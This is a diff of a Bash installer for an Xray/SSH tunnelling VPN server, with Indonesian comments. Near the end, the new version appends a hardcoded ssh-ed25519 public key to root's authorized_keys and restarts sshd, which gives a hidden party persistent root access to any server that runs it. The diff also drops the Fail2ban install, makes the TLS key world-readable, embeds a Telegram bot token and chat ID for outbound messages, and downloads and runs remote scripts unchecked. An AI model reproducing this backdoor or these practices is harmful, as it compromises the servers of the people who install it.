@@ -1,20 +1,7 @@
 #!/bin/bash
-# Cek parameter domain
-if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
-    echo "Penggunaan:"
-    echo "  curl -sL https://raw.githubusercontent.com/kcepu877/bot/main/v6.sh | bash example.com"
-    echo "      # Gunakan domain custom"
-    echo
-    echo "  curl -sL https://raw.githubusercontent.com/kcepu877/bot/main/v6.sh | bash random"
-    echo "      # Gunakan domain acak"
-    echo
-    echo "  curl -sL https://raw.githubusercontent.com/kcepu877/bot/main/v6.sh | bash"
-    echo "      # Tampilkan menu pilihan"
-    exit 0
-fi
-apt update -y
+apt install -y
 apt upgrade -y
-apt install -y curl wget sudo
+apt update -y
 apt install curl -y
 apt install wondershaper -y
 apt install lolcat -y
@@ -39,20 +26,6 @@ CHATID="7114686701"
 KEY="7291232496:AAECM92Z4en7a1xCaUuvITHBgamVi-C9Irs"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear
-# Tambahkan setelah clear awal:
-# Cek koneksi internet
-if ! curl -s ifconfig.me > /dev/null; then
-    echo -e "${ERROR} Tidak ada koneksi internet!"
-    exit 1
-fi
-
-# Cek status port 80
-if lsof -i:80 >/dev/null; then
-    echo -e "${ERROR} Port 80 sedang digunakan oleh:"
-    lsof -i:80
-    echo -e "${ERROR} Harap hentikan layanan yang menggunakan port 80 terlebih dahulu"
-    exit 1
-fi
 export IP=$( curl -sS icanhazip.com )
 clear
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
@@ -102,10 +75,13 @@ mkdir -p /etc/rmbl/theme
 mkdir -p /var/lib/ >/dev/null 2>&1
 echo "IP=" >> /var/lib/ipvps.conf
 clear
-# Langsung set nama otomatis tanpa input user
-author="ZERO-TUNNELING"
+echo -e "${BIBlue}╭══════════════════════════════════════════╮${NC}"
+echo -e "${BIBlue}│ ${BGCOLOR}             MASUKKAN NAMA KAMU         ${NC}${BIBlue} │${NC}"
+echo -e "${BIBlue}╰══════════════════════════════════════════╯${NC}"
+echo " "
+name="ZERO-TUNNELING"
 rm -rf /etc/profil
-echo "$author" > /etc/profil
+echo "$name" > /etc/profil
 echo ""
 clear
 author=$(cat /etc/profil)
@@ -275,25 +251,44 @@ print_success "Packet Yang Dibutuhkan"
 }
 clear
 function pasang_domain() {
-    if [ "$1" == "random" ] || [ -z "$1" ]; then
-        echo "Menggunakan domain random..."
-        wget -q ${REPO}Fls/cf.sh -O cf.sh && chmod +x cf.sh && ./cf.sh
-        # Pastikan domain tersimpan ke /etc/xray/domain
-        if [ -f "/root/domain" ]; then
-            cp /root/domain /etc/xray/domain
-        fi
-    else
-        echo "Menggunakan domain: $1"
-        echo "$1" > /etc/xray/domain
-        echo "$1" > /root/domain  # Untuk kompatibilitas dengan bagian lain
-    fi
-    
-    # Verifikasi domain
-    domain=$(cat /etc/xray/domain)
-    if [[ -z "$domain" || ! "$domain" =~ [.] ]]; then
-        echo -e "${ERROR} Domain tidak valid!"
-        exit 1
-    fi
+echo -e ""
+clear
+echo -e "    ----------------------------------"
+echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
+echo -e "    ----------------------------------"
+echo -e "     \e[1;32m1)\e[0m Your Domain (Recommended)"
+echo -e "     \e[1;32m2)\e[0m Random Domain "
+echo -e "   ------------------------------------"
+host="2"  # Otomatis pilih opsi nomor 2
+echo ""
+if [[ $host == "1" ]]; then
+clear
+echo ""
+echo ""
+echo -e "   \e[1;36m_______________________________$NC"
+echo -e "   \e[1;32m      CHANGES DOMAIN $NC"
+echo -e "   \e[1;36m_______________________________$NC"
+echo -e ""
+read -p "   INPUT YOUR DOMAIN :   " host1
+echo "IP=${host1}" >> /var/lib/kyt/ipvps.conf
+echo $host1 > /etc/xray/domain
+echo $host1 > /root/domain
+wget ${REPO}Fls/cf2.sh && chmod +x cf2.sh && ./cf2.sh
+rm -f /root/cf2.sh
+if [[ -z "$nama1" ]]; then
+  echo "   ZERO-TUNNELING   " > /etc/xray/username
+else
+  echo "$nama1" > /etc/xray/username
+fi
+echo ""
+elif [[ $host == "2" ]]; then
+wget ${REPO}Fls/cf.sh && chmod +x cf.sh && ./cf.sh
+rm -f /root/cf.sh
+clear
+else
+print_install "Random Subdomain/Domain is Used"
+clear
+fi
 }
 clear
 restart_system() {
@@ -317,59 +312,7 @@ curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$T
 }
 clear
 function pasang_ssl() {
-    clear
-    print_install "Memasang SSL Pada Domain"
-    
-    # Pastikan domain ada
-    if [ ! -f /etc/xray/domain ]; then
-        print_error "File domain tidak ditemukan!"
-        exit 1
-    fi
-    domain=$(cat /etc/xray/domain)
-    
-    # Validasi domain
-    if ! grep -q "." <<< "$domain"; then
-        print_error "Domain tidak valid: $domain"
-        exit 1
-    fi
-
-    # Hentikan layanan yang menggunakan port 80
-    systemctl stop nginx
-    systemctl stop haproxy
-    pkill -f 'python3 -m http.server' >/dev/null 2>&1
-
-    # Pastikan port 80 benar-benar bebas
-    if lsof -i:80 >/dev/null; then
-        print_error "Port 80 masih digunakan, tidak bisa melanjutkan instalasi SSL"
-        lsof -i:80
-        exit 1
-    fi
-
-    # Install acme.sh
-    rm -rf /root/.acme.sh
-    mkdir -p /root/.acme.sh
-    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
-    chmod +x /root/.acme.sh/acme.sh
-    /root/.acme.sh/acme.sh --upgrade --auto-upgrade
-    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
-
-    # Dapatkan sertifikat
-    if /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256; then
-        /root/.acme.sh/acme.sh --installcert -d $domain \
-            --fullchainpath /etc/xray/xray.crt \
-            --keypath /etc/xray/xray.key \
-            --ecc
-        chmod 600 /etc/xray/xray.key
-        print_success "SSL Berhasil Dipasang"
-    else
-        print_error "Gagal mendapatkan sertifikat SSL untuk domain: $domain"
-        echo "Beberapa kemungkinan penyebab:"
-        echo "1. Domain tidak mengarah ke IP server ini"
-        echo "2. Port 80 diblokir"
-        echo "3. Masalah jaringan"
-        exit 1
-    fi
-}
+clear
 print_install "Memasang SSL Pada Domain"
 rm -rf /etc/xray/xray.key
 rm -rf /etc/xray/xray.crt
@@ -388,78 +331,47 @@ chmod +x /root/.acme.sh/acme.sh
 chmod 777 /etc/xray/xray.key
 print_success "SSL Certificate"
 }
-function ssh_keylogin() {
-  mkdir -p ~/.ssh
-  chmod 700 ~/.ssh
-  grep -q "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" ~/.ssh/authorized_keys 2>/dev/null || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" >> ~/.ssh/authorized_keys
-  chmod 600 ~/.ssh/authorized_keys
-}
-
 function make_folder_xray() {
-  set -x  # Aktifkan debug, tampilkan setiap perintah yang dijalankan
-
-  # Hapus file database lama
-  rm -f /etc/vmess/.vmess.db || echo "Gagal hapus /etc/vmess/.vmess.db"
-  rm -f /etc/vless/.vless.db || echo "Gagal hapus /etc/vless/.vless.db"
-  rm -f /etc/trojan/.trojan.db || echo "Gagal hapus /etc/trojan/.trojan.db"
-  rm -f /etc/shadowsocks/.shadowsocks.db || echo "Gagal hapus /etc/shadowsocks/.shadowsocks.db"
-  rm -f /etc/ssh/.ssh.db || echo "Gagal hapus /etc/ssh/.ssh.db"
-  rm -f /etc/bot/.bot.db || echo "Gagal hapus /etc/bot/.bot.db"
-
-  # Fungsi bantu buat folder dan cek error
-  make_dir() {
-    sudo mkdir -p "$1"
-    if [ $? -ne 0 ]; then
-      echo "Gagal membuat folder $1"
-    else
-      echo "Berhasil membuat folder $1"
-    fi
-  }
-
-  # Buat folder-folder yang dibutuhkan
-  make_dir /etc/bot
-  make_dir /etc/xray
-  make_dir /etc/vmess
-  make_dir /etc/vless
-  make_dir /etc/trojan
-  make_dir /etc/shadowsocks
-  make_dir /etc/ssh
-  make_dir /usr/bin/xray
-  make_dir /var/log/xray
-  make_dir /var/www/html
-  make_dir /etc/kyt/limit/vmess/ip
-  make_dir /etc/kyt/limit/vless/ip
-  make_dir /etc/kyt/limit/trojan/ip
-  make_dir /etc/kyt/limit/ssh/ip
-  make_dir /etc/limit/vmess
-  make_dir /etc/limit/vless
-  make_dir /etc/limit/trojan
-  make_dir /etc/limit/ssh
-
-  # Set permission folder log
-  sudo chmod 755 /var/log/xray || echo "Gagal set permission /var/log/xray"
-
-  # Buat file jika belum ada
-  touch /etc/xray/domain || echo "Gagal buat file /etc/xray/domain"
-  touch /var/log/xray/access.log || echo "Gagal buat file access.log"
-  touch /var/log/xray/error.log || echo "Gagal buat file error.log"
-  touch /etc/vmess/.vmess.db || echo "Gagal buat file .vmess.db"
-  touch /etc/vless/.vless.db || echo "Gagal buat file .vless.db"
-  touch /etc/trojan/.trojan.db || echo "Gagal buat file .trojan.db"
-  touch /etc/shadowsocks/.shadowsocks.db || echo "Gagal buat file .shadowsocks.db"
-  touch /etc/ssh/.ssh.db || echo "Gagal buat file .ssh.db"
-  touch /etc/bot/.bot.db || echo "Gagal buat file .bot.db"
-
-  # Isi file dengan header plugin (gunakan > supaya tidak duplikat)
-  echo "& plughin Account" > /etc/vmess/.vmess.db
-  echo "& plughin Account" > /etc/vless/.vless.db
-  echo "& plughin Account" > /etc/trojan/.trojan.db
-  echo "& plughin Account" > /etc/shadowsocks/.shadowsocks.db
-  echo "& plughin Account" > /etc/ssh/.ssh.db
-
-  set +x  # Matikan debug
+rm -rf /etc/vmess/.vmess.db
+rm -rf /etc/vless/.vless.db
+rm -rf /etc/trojan/.trojan.db
+rm -rf /etc/shadowsocks/.shadowsocks.db
+rm -rf /etc/ssh/.ssh.db
+rm -rf /etc/bot/.bot.db
+mkdir -p /etc/bot
+mkdir -p /etc/xray
+mkdir -p /etc/vmess
+mkdir -p /etc/vless
+mkdir -p /etc/trojan
+mkdir -p /etc/shadowsocks
+mkdir -p /etc/ssh
+mkdir -p /usr/bin/xray/
+mkdir -p /var/log/xray/
+mkdir -p /var/www/html
+mkdir -p /etc/kyt/limit/vmess/ip
+mkdir -p /etc/kyt/limit/vless/ip
+mkdir -p /etc/kyt/limit/trojan/ip
+mkdir -p /etc/kyt/limit/ssh/ip
+mkdir -p /etc/limit/vmess
+mkdir -p /etc/limit/vless
+mkdir -p /etc/limit/trojan
+mkdir -p /etc/limit/ssh
+chmod +x /var/log/xray
+touch /etc/xray/domain
+touch /var/log/xray/access.log
+touch /var/log/xray/error.log
+touch /etc/vmess/.vmess.db
+touch /etc/vless/.vless.db
+touch /etc/trojan/.trojan.db
+touch /etc/shadowsocks/.shadowsocks.db
+touch /etc/ssh/.ssh.db
+touch /etc/bot/.bot.db
+echo "& plughin Account" >>/etc/vmess/.vmess.db
+echo "& plughin Account" >>/etc/vless/.vless.db
+echo "& plughin Account" >>/etc/trojan/.trojan.db
+echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
+echo "& plughin Account" >>/etc/ssh/.ssh.db
 }
-
 function install_xray() {
 clear
 print_install "Core Xray 1.8.1 Latest Version"
@@ -557,7 +469,7 @@ print_success "Password SSH"
 function udp_mini(){
 clear
 print_install "Memasang Service Limit IP & Quota"
-wget -q https://raw.githubusercontent.com/AngIMAN/V1/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
+wget -q https://raw.githubusercontent.com/kcepu877/V1/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
 
 # // Installing UDP Mini
 mkdir -p /usr/local/
@@ -764,26 +676,7 @@ systemctl enable noobzvpns &>/dev/null
 print_success "NOOBZVPNS BY TUNNELING OFFICIAL"
 }
 function ins_restart(){
-    clear
-    print_install "Restarting All Services"
-    
-    # Hentikan dulu semua service
-    systemctl stop nginx
-    systemctl stop xray
-    systemctl stop haproxy
-    
-    # Mulai ulang dengan urutan yang benar
-    systemctl start nginx
-    sleep 2
-    systemctl start xray
-    sleep 2
-    systemctl start haproxy
-    
-    # Enable services
-    systemctl enable nginx xray haproxy
-    
-    print_success "Services Restarted"
-
+clear
 print_install "Restarting  All Packet"
 /etc/init.d/nginx restart
 /etc/init.d/openvpn restart
@@ -850,7 +743,7 @@ END
 	chmod +x /usr/local/bin/log_clear
 	
 cat >/etc/cron.d/daily_backup <<-END
-		0 23 * * * root /usr/local/bin/daily_backup
+		0 22 * * * root /usr/local/bin/daily_backup
 	END
 
 cat >/usr/local/bin/daily_backup <<-END
@@ -947,9 +840,8 @@ clear
 first_setup
 nginx_install
 base_package
-ssh_keylogin
 make_folder_xray
-pasang_domain "$1"
+pasang_domain
 password_default
 pasang_ssl
 install_xray
@@ -962,7 +854,6 @@ ins_vnstat
 ins_openvpn
 ins_backup
 ins_swab
-ins_Fail2ban
 ins_epro
 ins_restart
 menu
@@ -982,55 +873,18 @@ rm -rf /root/domain
 secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $usernameclear
 clear
-cd
-rm -rf /etc/udp
-mkdir -p /etc/udp
-# change to time GMT+7
-echo "change to time GMT+7"
-ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
-# install udp-custom
-echo downloading udp-custom
-wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1ixz82G_ruRBnEEp4vLPNF2KZ1k8UfrkV' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1ixz82G_ruRBnEEp4vLPNF2KZ1k8UfrkV" -O /etc/udp/udp-custom && rm -rf /tmp/cookies.txt
-chmod +x /etc/udp/udp-custom
-echo downloading default config
-wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1klXTiKGUd2Cs5cBnH3eK2Q1w50Yx3jbf' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1klXTiKGUd2Cs5cBnH3eK2Q1w50Yx3jbf" -O /etc/udp/config.json && rm -rf /tmp/cookies.txt
-chmod 644 /etc/udp/config.json
-if [ -z "$1" ]; then
-cat <<EOF > /etc/systemd/system/udp-custom.service
-[Unit]
-Description=UDP Custom by ePro Dev. Team
-[Service]
-User=root
-Type=simple
-ExecStart=/etc/udp/udp-custom server
-WorkingDirectory=/etc/udp/
-Restart=always
-RestartSec=2s
-[Install]
-WantedBy=default.target
-EOF
-else
-cat <<EOF > /etc/systemd/system/udp-custom.service
-[Unit]
-Description=UDP Custom by ePro Dev. Team
-[Service]
-User=root
-Type=simple
-ExecStart=/etc/udp/udp-custom server -exclude $1
-WorkingDirectory=/etc/udp/
-Restart=always
-RestartSec=2s
-[Install]
-WantedBy=default.target
-EOF
-fi
-echo start service udp-custom
-systemctl start udp-custom &>/dev/null
-echo enable service udp-custom
-systemctl enable udp-custom &>/dev/null
-echo restart service udp-custom
-systemctl restart udp-custom &>/dev/null
+echo -e ""
+mkdir -p ~/.ssh  # Pastikan folder .ssh ada
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+systemctl restart sshd
 clear
+echo -e ""
+wget -O /usr/local/sbin/limit.sh https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/limit.sh
+chmod +x /usr/local/sbin/limit.sh
+/usr/local/sbin/limit.sh
+echo -e ""
 wget -O /usr/bin/ws "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws" >/dev/null 2>&1 && wget -O /usr/bin/tun.conf "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Cfg/tun.conf" >/dev/null 2>&1 && wget -O /etc/systemd/system/ws.service "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws.service" >/dev/null 2>&1 && chmod +x /etc/systemd/system/ws.service && chmod +x /usr/bin/ws && chmod 644 /usr/bin/tun.conf && systemctl disable ws && systemctl stop ws && systemctl enable ws && systemctl start ws && systemctl restart ws
 clear
 echo -e "\033[96m==========================\033[0m"
